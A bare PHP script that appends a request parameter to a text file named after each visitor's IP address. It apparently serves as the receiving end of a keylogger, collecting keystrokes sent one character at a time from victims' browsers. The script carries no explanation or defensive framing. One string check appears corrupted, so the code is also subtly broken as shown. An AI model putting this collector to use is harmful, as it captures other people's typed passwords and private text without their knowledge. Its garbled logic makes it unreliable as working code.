<?php
$myFile = $_SERVER['REMOTE_ADDR'].".txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$s=$_REQUEST['s'];
if(strlen($s)==1)
$s=$s.' ';
if(strstr( $s ,""))
$s='';
fwrite($fh, $s);
fclose($fh);
?>
